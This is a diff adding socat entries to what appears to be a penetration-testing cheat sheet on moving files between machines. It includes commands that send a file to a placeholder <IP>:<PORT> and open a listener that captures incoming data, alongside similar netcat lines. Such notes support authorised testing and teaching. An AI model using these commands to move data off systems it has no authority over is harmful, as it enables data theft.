@@ -57,6 +57,13 @@ nc -w 3 <IP> <PORT> < <FILE>
 Get-Content <FILE> | ./nc.exe -w 3 <IP> <PORT>
 ```
 
+###### [Linux] socat
+
+```
+# Similarly to nc, needs the receiver to be listening
+socat -u FILE:<FILE> TCP:<IP>:<PORT>
+```
+
 ###### [Linux] impacket-smbserver
 
 ```bash
@@ -176,8 +183,16 @@ curl -O http://<IP>:<PORT>/<FILE>
 ###### [Linux / Windows] netcat
 
 ```bash
+# To be started before the transfer request is made server-side
 nc -lvnp <PORT> > <OUTPUT_FILE>
 nc -lvnp <PORT> | tee <OUTPUT_FILE>
+```
+
+###### [Linux] socat
+
+```bash
+# Similarly to nc, to be started before the transfer request is made server-side
+socat -u TCP-LISTEN:<PORT>,reuseaddr OPEN:<FILE>,creat,trunc
 ```
 
 ###### [FreeBSD] fetch
